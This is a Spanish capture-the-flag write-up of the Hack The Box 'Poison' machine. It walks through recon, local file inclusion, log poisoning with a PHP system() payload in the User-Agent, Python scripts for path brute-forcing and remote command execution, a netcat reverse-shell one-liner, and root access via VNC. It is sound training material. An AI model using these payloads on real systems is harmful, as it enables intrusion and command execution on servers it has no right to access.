---
layout: single
title: Poison - Hack The Box
excerpt: "Poison es la maquina linux perfecta para aprender sobre Log Poisoning, tambien me ha dado mucha libertad para crear mis scripts y practicar python, espero que os guste mi WriteUp"
date: 2021-11-15
classes: wide
header:
  teaser: /assets/images/Poison/Untitled.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  -   Web
  -   Log Poisoning
  -   OSCP
  -   Scripting
  -   VNC
---

<div>
<p style = 'text-align:center;'>
<img src="http://www.hackthebox.eu/badge/image/497437" alt="" width="200px">
</p>
</div>

# Poison

![Untitled](/assets/images/Poison/Untitled.png)

### INDICE

1. RECONOCIMIENTO
2. ESCANEO
3. OBTENIENDO ACCESO
4. ESCALACIÓN DE PRIVILEGIOS

## 1º RECONOCIMIENTO

Obtenemos la IP de la platarforma de HackTheBox, gracias a la herramienta ping obtenemos el TTL de la maquina:

`ping -c 1 10.10.10.84`

![Untitled](/assets/images/Poison/Untitled%201.png)

Tiene 63 de TTL, gracias a esto sabemos que estamos delante de una maquina de SO Linux. Todas las maquinas Linux tienen de TTL 64, en este caso tiene 63 por que no tenemos ping directo con la maquina, esto quiere decir que pasa por unos nodos intermediarios que hacen que el TTL disminuya, como vemos en la siguiente imagen:

![Untitled](/assets/images/Poison/Untitled%202.png)

Una vez que sabemos el SO de la victima, vamos a proceder a escanear los puertos de la misma.

## 2º ESCANEO

El escaneo se va a realizar con la herramienta `nmap` 

Con este comando realizamos un escaneo rápido de los puertos abiertos por TCP

`nmap -sS --min-rate 5000 --open -p- -vvv -n -Pn 10.10.10.84 -oG allPorts`

![Untitled](/assets/images/Poison/Untitled%203.png)

Vemos que tiene abiertos los puertos 22 y 80. Realizamos otro escaneo mas exhaustivo de estos puertos. Con el siguiente comando realizamos un escaneo de versiones y también `nmap` lanza una serie de scripts básicos de enumeración.

`nmap -sCV -p22,80 10.10.10.84 -oN scanPorts`

![Untitled](/assets/images/Poison/Untitled%204.png)

`nmap` no nos reporta nada interesante aparte de las versiones que usan estos servicios. Antes de entrar en la pagina web que se ejecuta en el puerto 80, voy a enumerar un poco mas con la herramienta `whatweb`

`whatweb http://10.10.10.84`

![Untitled](/assets/images/Poison/Untitled%205.png)

Vemos la versión de PHP y Apache que usa la web.

Ahora procedemos a enumerar la web a mano.

![Untitled](/assets/images/Poison/Untitled%206.png)

Si le pasamos uno de los archivos que nos sugiere nos ejecuta ese archivo .php

![Untitled](/assets/images/Poison/Untitled%207.png)

En la URL podemos ver que utiliza `/browse.pgp?file=` . Podría usar esto para listar archivos del sistema usando la vulnerabilidad web llamada LFI (Local File Inclusion).

[https://atalantago.com/lfi/#:~:text=Esta técnica consiste en incluir,archivos alojados en otros servidores](https://atalantago.com/lfi/#:~:text=Esta%20t%C3%A9cnica%20consiste%20en%20incluir,archivos%20alojados%20en%20otros%20servidores)

Pero antes el archivo listfiles.php nos muestra esta informacion.

![Untitled](/assets/images/Poison/Untitled%208.png)

Esto me hace pensar que puede haber una rchivo llamado pwdbackup.txt en esta ruta y que podemos ver su contenido.

![Untitled](/assets/images/Poison/Untitled%209.png)

Hay una contraseña encodeada 13 veces, podemos decodearla en la pagina web :

[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

Deslizamos `From Base64` a `Recipe` 13 veces para decodearla 13 veces y vemos una contraseña:

![Untitled](/assets/images/Poison/Untitled%2010.png)

`Charix!2#4%6&8(0`

Tenemos una contraseña, pero no conocemos ningún usuario, hay que seguir enumerando el sistema.

Vamos a explotar la vulnerabilidad LFI que habíamos dicho anteriormente.
Para ello he creado una herramienta que automatiza la búsqueda de rutas en un posible LFI.

```python
#!/usr/bin/python3
from pwn import *
import pdb
 
#Variables
URL = "http://10.10.10.84/browse.php?file="
  
def def_hundler(sig, frame):
    print("[!]Saliendo...")
    sys.exit(1)
 
signal.signal(signal.SIGINT, def_hundler)
 
#Funciones
def makeRequest():
    try:
        p1 = log.progress("Iniciando Fuerza Bruta de directorios")
        with open('diccionario.txt', encoding='utf8') as f:
            for line in f:
                p1.status("Probando con la ruta %s" % line.strip())
                r = requests.get(URL+line.strip())
#               pdb.set_trace()
                if "Failed opening" in r.text:
                    pass
                else:
                    print("Se ha encontrado una ruta: %s" % line.strip())                     
    except Exception as e:
        print(e)
 
if __name__ == '__main__':
    print(""" 
██╗    ██╗███████╗██████╗     ███████╗██╗   ██╗███████╗███████╗███████╗██████╗ 
██║    ██║██╔════╝██╔══██╗    ██╔════╝██║   ██║╚══███╔╝╚══███╔╝██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝    █████╗  ██║   ██║  ███╔╝   ███╔╝ █████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗    ██╔══╝  ██║   ██║ ███╔╝   ███╔╝  ██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝    ██║     ╚██████╔╝███████╗███████╗███████╗██║  ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝ by Tukutu""")
    makeRequest()
```

[https://pastebin.com/A4eGdwRv](https://pastebin.com/A4eGdwRv)

![Untitled](/assets/images/Poison/Untitled%2011.png)

Encontramos la ruta `/var/log/httpd-access.log`

accedemos a ella y vemos el registro de unos logs, un ataque que se podría realizar seria un `log poisoning` (envenenamiento de los logs)

[https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)

![Untitled](/assets/images/Poison/Untitled%2012.png)

Vemos que nos muestra el User-Agent de peticiones que se realizan a la web, algo que se podría intentar seria intentar inyectar codigo php en User-Agent de una petición a la pagina web y mirar en esta ruta si nos esta ejecutando el comando.

En el phpinfo.php de la pagina web no tiene ninguna desable_function por lo que podriamos llegar a ejecutar comandos con inyecciones php.

![Untitled](/assets/images/Poison/Untitled%2013.png)

Capturamos una petición a la web con BurpSuite y modificamos el User-Agent a nuestro antojo.

![Untitled](/assets/images/Poison/Untitled%2014.png)

Y en la pagina web intentamos ejecutar algun comando:

![Untitled](/assets/images/Poison/Untitled%2015.png)

Puedo ejecutar comandos en la maquina.

## 3. OBTENIENDO ACCESO

Creo un script en python para automatizarme la intrusion:

[https://pastebin.com/0zx4cF0U](https://pastebin.com/0zx4cF0U)

```python
#!/usr/bin/python3
#Script en python para conseguir RCE en la maquina Poison de HTB a traves de la vulnerabilidad Log Poisoning
#Uso del script: python3 RCE_Poison.py <command>
#Creator: H4ckBl0g.github.io 
from pwn import *
 
if len(sys.argv) != 2:
    print("\nUso: python3 RCE_Poison.py <command>")
    print("""\nEjemplo: python3 RCE_poison.py "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f" """)
    sys.exit(1) 
#Variables
cmd = sys.argv[1]
URL = "http://10.10.10.84/browse.php?file=/var/log/httpd-access.log"
URL_command = "http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log&cmd="
def def_hundler(sig, frame):
    print("\n[!]Saliendo...\n")
    sys.exit(1) 
#CTRL+C
signal.signal(signal.SIGINT, def_hundler)
 
#Funciones
def makeRequest():
    t = requests.post(URL_command)
    if "Cannot execute a blank command" not in t.text:
        headers_data = {
            "User-Agent" : "<?php system($_GET['cmd']); ?>"
        }
        r = requests.post(URL, headers=headers_data)
    if "Cannot execute a blank command" in t.text:
        print("✅ Podemos ejecutar comandos en el sistema\n\nOutput:\n")
    else:
        print("No se puede ejecutar comandos")
        sys.exit(1)
    s = requests.get(URL_command + urlencode(cmd))
    output = re.findall(r'"POST \/browse.php\?file=\/var\/log\/httpd-access.log HTTP\/1.1" 200 \d+ "-" "([\s\S]*?)\n"', s.text)[0]
    print(output)
  
if __name__ == '__main__':
    print("""
                                                                                 
,------.  ,-----.,------.      ,------.  ,-----. ,--. ,---.   ,-----. ,--.  ,--. 
|  .--. ''  .--./|  .---'      |  .--. ''  .-.  '|  |'   .-' '  .-.  '|  ,'.|  | 
|  '--'.'|  |    |  `--,       |  '--' ||  | |  ||  |`.  `-. |  | |  ||  |' '  | 
|  |\  \ '  '--'\|  `---.,----.|  | --' '  '-'  '|  |.-'    |'  '-'  '|  | `   | 
`--' '--' `-----'`------''----'`--'      `-----' `--'`-----'  `-----' `--'  `--' by Tukutu                                                  
        """)
    makeRequest()
```

![Untitled](/assets/images/Poison/Untitled%2016.png)

Nos enviamos una Reverse Shell a nuestro equipo:

![Untitled](/assets/images/Poison/Untitled%2017.png)

Ya hemos ganado acceso, vemos que hay un usuario llamado charix

![Untitled](/assets/images/Poison/Untitled%2018.png)

Podemos intentar conectarnos por ssh con ese usuario y la contraseña que habiamos extraido de la web.

![Untitled](/assets/images/Poison/Untitled%2019.png)

Hemos ganado acceso como el usuario Charix, podemos ver la flag user

![Untitled](/assets/images/Poison/Untitled%2020.png)

Tambien encontramos un archivo llamado secret.zip

![Untitled](/assets/images/Poison/Untitled%2021.png)

Nos lo pasamos a nuestro equipo para descomprimirlo.

![Untitled](/assets/images/Poison/Untitled%2022.png)

Nos pide una contraseña para poder descomprimirlo, antes de usar cualquier herramienta para romper la contraseña hay que utilizar las contraseñas que ya tengamos, en este caso la contraseña del usuario charix.

![Untitled](/assets/images/Poison/Untitled%2023.png)

Ha funcionado, pero el texto no es legible.

![Untitled](/assets/images/Poison/Untitled%2024.png)

Haciendo un reconocimiento del sistema, encuentro que hay un sercicio vnc

`ps -auwwx | grep vnc`

![Untitled](/assets/images/Poison/Untitled%2025.png)

Este servicio suele ejecutarse en el puerto 5901

`netstat -an -p tcp`

![Untitled](/assets/images/Poison/Untitled%2026.png)

## 4. ESCALACIÓN DE PRIVILEGIOS

En esta pagina nos dice como podríamos aprovecharnos de este servicio

[https://book.hacktricks.xyz/pentesting/pentesting-vnc](https://book.hacktricks.xyz/pentesting/pentesting-vnc)

Siguiendo las pautas, podemos conectarnos con kali a la máquina víctima de la siguiente forma: con el comando vncviewer y utilizando un archivo de contraseña (secret) configuramos nuestro proxychain de esta forma

![Untitled](/assets/images/Poison/Untitled%2027.png)

Nos conectamos por ssh de nuevo pero pasando por el proxy configurado

![Untitled](/assets/images/Poison/Untitled%2028.png)

Ahora que estamos usando el proxychains, nos conectamos al servicio VNC con proxychains proporcinando el archivo secret

`proxychains vncviewer 127.0.0.1:5901 -passwd secret`

Hemos conseguido acceso remoto a la maquina con vncviewer y como el usuario root

![Untitled](/assets/images/Poison/Untitled%2029.png)